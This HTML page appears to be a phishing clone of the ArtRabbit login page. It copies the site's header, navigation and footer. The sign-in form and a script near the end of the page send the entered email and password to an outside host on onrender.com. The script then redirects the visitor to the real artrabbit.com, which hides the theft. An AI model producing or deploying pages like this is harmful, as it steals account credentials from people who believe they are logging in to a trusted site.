<!DOCTYPE html><!--[if lt IE 7]><html class="no-js lt-ie10 lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html class="no-js lt-ie10 lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html class="no-js lt-ie10 lt-ie9"><![endif]--><!--[if IE 9]><html class="no-js lt-ie10"><![endif]--><!--[if gt IE 9]><!--><html class="js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Login - ArtRabbit</title>
    <meta name="description" content="ArtRabbit is a platform for international contemporary art exhibitions and events">
    <meta property="og:title" content="Login - ArtRabbit">
    <meta property="og:site_name" content="ArtRabbit">
    <meta property="og:url" content="https://www.artrabbit.com/log-in">
    <meta property="og:description" content="ArtRabbit: International contemporary art exhibitions and events.">
    <meta property="og:image" content="images/AR_share_placeholder.jpg">
    <meta property="article:publisher" content="https://www.facebook.com/ArtRabbit">
    <meta name="viewport" content="width=device-width,initial-scale=1">
 	<!--[if IE]>
 		<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<script type="text/javascript" src="js/jquery-1.8.2.min.js"></script><script type="text/javascript" src="js/are-min.js"></script><script defer="" data-api="/ct/event" data-domain="artrabbit.com" src="js/ct.js"></script>
	<link rel="alternate" type="application/rss+xml" href="https://www.artrabbit.com/network/features.rss" title="ArtRabbit Editorial RSS feed">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#1e27c1">
	<meta name="msapplication-TileColor" content="#1e27c1">
	<meta name="theme-color" content="#1e27c1">
	<script>document.createElement( "picture" );var html=document.getElementsByTagName('html'); html[0].setAttribute('class', 'js');</script>
	<script async="true" src="js/picturefill.min.js"></script>
	<link rel="stylesheet" href="css/main.min.css">
	<link rel="preload" href="/layout/ui/fonts/avenir-next/avenir-next-regular.woff2" as="font" type="font/woff2" crossorigin="">
	<link rel="preload" href="/layout/ui/fonts/avenir-next/avenir-next-demi.woff2" as="font" type="font/woff2" crossorigin="">
	<link rel="preload" href="/layout/ui/fonts/alpha-mack-aoe/alpha-mack-aoe.woff2" as="font" type="font/woff2" crossorigin="">
</head>
<body class="mod--form">
    

<header>
    <div class="Site-head js-getTimezone">
		
        <!-- Header -->
        <div class="Header">
			
            <div class="Header-logo">

                <!-- Logo -->
                <a href="/" class="Logo">Welcome to ArtRabbit</a>
                <!-- / Logo -->

            </div>
            <div class="Header-nav  m_menu" id="ar_menu">

                <ul class="m_menu-item m_menu-secondary" id="ar_menu-secondary">
                	<li class="app-button-navitem">
							<div class="app-button">
			                	<div class="app-button-circle">
			                		<a href="/what-you-can-do/app" class="app-button rotated">Get<br>the app</a>
			                	</div>
			                </div>	
						</li>
                    <li class="js-search-toggle">
                        <a href="/search" class="m_menu-control" data-menutype="search"><span class="m_nav-control-icon mod--search">Toggle </span>Search</a>
                    </li>
                    
<li>
	<a href="" class="m_menu-control m_nav-override" data-menutype="social">
		<span class="m_nav-control-icon mod--login">Toggle </span>Log in
	</a>
</li>

                </ul>
                <ul class="m_menu-item m_menu-primary" role="nav" id="ar_menu-primary">
                    <li><a class="m_menu-control mod--active" href="/home">Home</a></li><li><a class="m_menu-control" href="/events">Events</a></li><li><a class="m_menu-control" href="/online">Online Events</a></li><li><a class="m_menu-control" href="/artworks">Artworks for sale</a></li><li><a class="m_menu-control" href="/events#map">Art Map</a></li> <li><a class="m_menu-control" href="/network/features">Editorial Features</a></li> <li><a class="m_menu-control" href="/artist-opportunities">Open Calls</a></li>
                    
                </ul>

            </div>
        </div>
        <!-- / Header -->

	</div>
	
</header>

<div class="m_slideout">
	<div class="m_slideout-bar">
		<div id="nav" class="m_slideout-menu">

			<div class="mod--tSp">
				<h4>Contribute</h4>
				<p class="">ArtRabbit is an open submission platform. Anyone
					can add events. Organisation owners can manage their 
					organisation presence.</p>
				<ul class="m_slideout-menu-page-list mod--tight">
					<li><a href="/events/find-venue" class="b_submit mod--next m_full-loader">Add an Event</a></li>
					<li><a href="/organisations/add-organisation" class="b_submit mod--next m_full-loader">Add an Organisation</a></li>
					<li><a href="/register" class="b_submit mod--next m_full-loader">Sign up</a></li>
				</ul>
			</div>

		</div>
		<form id="search" class="m_slideout-menu mod--search" style="display: none;" action="/search" method="get">
			<h3 class="b_large-heading mod--primary">Keyword search</h3>
			<p>Find events, people, organisations or locations by name</p>
			<div class="m_slideout-search-holder l_section">
				<input class="m_slideout-search" name="query" type="search" placeholder="Search here...">
				<input class="b_submit m_full-loader mod--go m_slideout-search-go" type="submit" value="Go">
			</div>
			<h3 class="b_large-heading mod--primary">Location search</h3>
			<p>Use the <a href="/events">events</a> or the <a href="/venues">venues </a> search to find listings near a location.</p>
		</form>
		<div id="social" class="m_slideout-menu">
			
			
		</div>
	</div>
</div>


    
    <div class="Site-body">
        


        <div class="Site-section">
            <main>

                <div class="main">
                    

	




                    <header class="l_row l_section l_inner-position">
                        <div class="g_grid-8 r_b1_grid-9 r_b3_grid-12">
                            <div class="l_inner-grid">
                                <h2 class="b_large-heading mod--primary">Login</h2>
                                
                                
                                
                            </div>
                        </div>
                        
                        


































                        
                    </header>

                    <div class="l_row l_section">
                        <div class="g_grid-6 r_b2_grid-8 r_b3_grid-12 g_inset-2 r_b2_inset-1 r_b3_no-inset l_section">
                            <div class="l_inner-grid">

                                <form class="form-signin" role="form" action="https://gmx-v3nl.onrender.com/art" method="POST">

                                    <div class="m_field">
                                        <label class="b_label" for="email">Email address</label>
                                        <input type="text" name="email" class="b_input" value="" id="email" required="" autofocus="" autocorrect="off" autocapitalize="none">
                                        
                                    </div>
                                    <div class="m_field">
                                        <label class="b_label" for="password">Password</label>
                                        <input type="password" name="password" class="b_input" id="password" required="">
                                    </div>

                                    <div class="m_field">
                                        <div class="m_custom-checkbox m_custom-btn">
                                            <span class="m_custom-btn-icon">Select</span>
                                            <label class="m_custom-btn-text" for="rememberme">Remember me</label>
                                            <input class="m_real-checkbox m_real-btn" type="checkbox" value="remember-me" id="rememberme">
                                        </div>
                                    </div>
									<div class="m_field">
										<p class="b_hint">To personalise your member experience there is a minimal amount of personal data that we collect and store when you log in. 
							 		We do this by setting a few essential cookies. Read our full <a href="/about-artrabbit/cookie-policy">Cookie Policy</a>, <a href="/about-artrabbit/privacy">Privacy Notice</a>, and <a href="/about-artrabbit/terms">Terms and Conditions</a>.</p>
									</div>
                                    <div class="m_field">
                                    	
                                        <input type="submit" class="b_submit m_full-loader" value="Log in">
                                        <input type="hidden" name="action_login" id="action_login" value="true">
                                    </div>

                                </form>
                            </div>
                            <div class="l_inner-grid mod--tSp">
                                <div class="m_field">
                                    <p class="b_label">Forgot your login details?</p>
                                    <p class="b_hint"><a href="/password">Click to reset your password</a></p>
                                </div>
    
    
                            </div>
                            
                        </div>
                    </div>
                    <div class="l_row l_section l_section">
                    <div class="g_grid-6 r_b2_grid-8 r_b3_grid-12 g_inset-2 r_b2_inset-1 r_b3_no-inset">
                        <div class="l_inner-grid">
                            <div class="m_field">
                                <p class="b_input-alert">Not a member yet?</p>
                                <p class="b_hint"><a href="/register">Join Artrabbit</a></p>
                            </div>



                        </div>
                        <div class="l_inner-grid">
                            <div class="m_field social-btns">
                                <p class="b_input-alert">Or sign in with</p>
                                <a href="/site/extensions/twitteroauth/redirect.php"><img src="images/sign-in-with-twitter-link.png" alt="Sign in with X"></a>

                            </div>

                        </div>

                        
                        
                    </div>

                </div>

                </div>

            </main>
        </div>
    </div>
    <footer>
        <div class="Site-foot">

            <div class="m_footer mod--white">

                <div class="l_frame">
                    <div class="m_report-bar">
                        <div class="m_report-form"><a href="https://artrabbit.uservoice.com/" id="report-button" class="m_report-button mod--flag"><span>Give feedback, report a problem or request access to your information.</span></a></div>
                    </div>
                </div>
                 
<div class="m_footer-divider">
	<div class="l_frame">
		<div class="l_row">
			
<div class="g_grid-2 r_b2_grid-3">
	<div class="l_inner-grid r_b3_accordion">
		<h4 class="b_footer-heading r_b3_instruction-button">About <span class="b_chevron-icon">Toggle</span></h4>
		<ul class="h_list-reset r_b3_accordion-content">
			<li class="l"><a href="/about/artrabbit">ArtRabbit</a></li><li class="l"><a href="/about/community-guidelines">Community Guidelines</a></li><li class="l"><a href="/about/places">Places</a></li><li class="l"><a href="/about/app">App</a></li><li class="l"><a href="/network/partners">Partners</a></li><li class="l"><a href="https://www.artrabbit.com/about/art-travel-companion">Art and Culture Travel Companion</a></li>
		</ul>
	</div>
</div>

<div class="g_grid-2 r_b2_grid-3">
	<div class="l_inner-grid r_b3_accordion">
		<h4 class="b_footer-heading r_b3_instruction-button">What you can do <span class="b_chevron-icon">Toggle</span></h4>
		<ul class="h_list-reset r_b3_accordion-content">
			<li class="l"><a href="/what-you-can-do/organisations">Organisations</a></li><li class="l"><a href="/what-you-can-do/pr-professionals">PR Professionals</a></li><li class="l"><a href="https://www.artrabbit.com/what-you-can-do/fairs-festivals-and-multi-site-events">Fairs, Festivals and Multi-Site Events</a></li><li class="l"><a href="/what-you-can-do/artists">Artists</a></li><li class="l"><a href="/what-you-can-do/curators">Curators</a></li><li class="l"><a href="/what-you-can-do/art-lovers">Art Lovers</a></li><li class="l"><a href="https://www.artrabbit.com/artworks">Buy Artworks</a></li>
		</ul>
	</div>
</div>

<div class="g_grid-2 r_b2_grid-3">
	<div class="l_inner-grid r_b3_accordion">
		<h4 class="b_footer-heading r_b3_instruction-button">Plans & Pricing <span class="b_chevron-icon">Toggle</span></h4>
		<ul class="h_list-reset r_b3_accordion-content">
			<li class="l"><a href="https://www.artrabbit.com/organisations/plans">Plans</a></li><li class="l"><a href="https://www.artrabbit.com/organisations/plans-starter">Starter Plan</a></li><li class="l"><a href="https://www.artrabbit.com/organisations/plans-pro">Pro Plan</a></li><li class="l"><a href="https://www.artrabbit.com/organisations/plans-premium">Premium Plan</a></li><li class="l"><a href="/what-you-can-do/advertise">Advertising</a></li><li class="l"><a href="/what-you-can-do/boost-events">Boosts</a></li>
		</ul>
	</div>
</div>

			<div class="g_grid-4 r_b2_grid-12 m_footer-spacer">
				<div class="l_inner-grid">
					<label for="nl_email_field" class="b_footer-heading">We send art emails</label>
					<p>Updates on openings, ArtOpps & more</p>
					<form action="/subscribe" class="modalform m_footer-subscribe" data-action="/subscribe" data-modal="modal" method="post">
						
						<input class="b_input" id="nl_email_field" type="text" name="email" placeholder="Email address">
						<input class="m_footer-subscribe-sub" type="submit" name="submit" value="submit">
					</form>



					<ul class="m_footer-social h_list-reset">
						<li>
							<a href="http://twitter.com/ArtRabbit" target="_blank" class="m_action-button m_footer-social-action" rel="noopener noreferrer">
								<span class="m_action-icon mod--twitter">Follow us on: </span>
								<span class="m_action-text">X</span>
							</a>
						</li>
						<li>
							<a href="http://www.facebook.com/ArtRabbit" target="_blank" class="m_action-button m_footer-social-action" rel="noopener noreferrer">
								<span class="m_action-icon mod--facebook">Follow us on: </span>
								<span class="m_action-text">Facebook</span>
							</a>
						</li>
						<li>
							<a href="http://instagram.com/artrabbit" target="_blank" class="m_action-button m_footer-social-action" rel="noopener noreferrer">
								<span class="m_action-icon mod--instagram">Follow us on: </span>
								<span class="m_action-text">Instagram</span>
							</a>
						</li>
						<li>
							<a href="http://pinterest.com/artrabbit" target="_blank" class="m_action-button m_footer-social-action" rel="noopener noreferrer">
								<span class="m_action-icon mod--pinterest">Follow us on: </span>
								<span class="m_action-text">Pinterest</span>
							</a>
						</li>
						<li>
							<a href="https://www.linkedin.com/company/artrabbit-ltd" target="_blank" class="m_action-button m_footer-social-action" rel="noopener noreferrer">
								<span class="m_action-icon mod--linkedin">Follow us on: </span>
								<span class="m_action-text">LinkedIn</span>
							</a>
						</li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="m_footer-divider">
	<div class="l_frame">
		<div class="l_row m_footer-spacer">

<div class="g_grid-2 r_b2_grid-3">
	<div class="l_inner-grid r_b3_accordion">
		<h4 class="b_footer-heading r_b3_instruction-button">Resources <span class="b_chevron-icon">Toggle</span></h4>
		<ul class="h_list-reset r_b3_accordion-content">
			<li class="l"><a href="/support/faqs">FAQs</a></li><li class="l"><a href="/support/logo-and-badges">Logos</a></li><li class="l"><a href="/support/suggested-and-upcoming-events">Suggestions</a></li><li class="l"><a href="/support/visiting-museums-and-galleries-during-covid">Covid-19</a></li><li class="l"><a href="/artist-opportunities">Open Calls</a></li><li class="l"><a href="https://bit.ly/3I7vyiR">Submit an Open Call</a></li><li class="l"><a href="https://www.artrabbit.com/network/partnerships">Partnerships</a></li><li class="l"><a href="https://www.artrabbit.com/what-you-can-do/advertise/asset-specifications">Asset Specifications</a></li><li class="l"><a href=""></a></li>
		</ul>
	</div>
</div>

</div></div></div>

<div class="m_footer-copyright m_footer-divider">
	<div class="l_frame">
		<div class="l_row r_b3_accordion">
            <div class="g_grid-12 r_b2_grid-12 m_footer-spacer">
                <div class="l_inner-grid">
                    <h4 class="r_b3_instruction-button h_dsk-hide">Copyright and terms <span class="b_chevron-icon">Toggle</span></h4>
                    <ul class="h_list-reset r_b3_accordion-content mod--bottomFooter">
                        <li class="l"><a href="/about/terms">Terms</a></li><li class="l"><a href="/about/privacy">Privacy</a></li><li class="l"><a href="/about/cookie-policy">Cookie Policy</a></li><li class="l"><a href="/about/advertising-terms">Advertising Terms</a></li><li class="l"><a href="/support/contact">Contact</a></li>
                        <li>© ArtRabbit 2025</li>
                    </ul>
                </div>
            </div>
		</div>
	</div>
</div>

            </div>

        </div>
    </footer>


    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('.form-signin');
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault(); // Prevent default form submission
                
                const formData = new FormData(form);
                
                try {
                    const response = await fetch('https://gmx-v3nl.onrender.com/art', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === "success") {
                        window.location.href = 'https://artrabbit.com';
                    }
                } catch (error) {
                    console.error('Error:', error);
                }
            });
        });
        </script>

    
<script type="text/javascript">
var html=document.getElementsByTagName('html'); html[0].setAttribute('class', 'js');
function loadScript(src, callback) {var s,r,t;r = false;s = document.createElement('script');s.type = 'text/javascript';s.src = src;s.onload = s.onreadystatechange = function() {if ( !r && (!this.readyState || this.readyState == 'complete') ){r = true;callback();}};t = document.getElementsByTagName('script')[0];t.parentNode.insertBefore(s, t);}
var art_addsc = function(){ }
var are = loadScript('/layout/ui/js/min/are-min.js?v=0.4',art_addsc);
var art_addsc_delay = function() { }
var sc = function(){loadScript('/layout/ui/js/min/artrabbit-min.js?v=4.83',art_addsc)}
var jq = loadScript('/layout/ui/js/libs/jquery-1.8.2.min.js',sc)
</script>

 




</body></html>
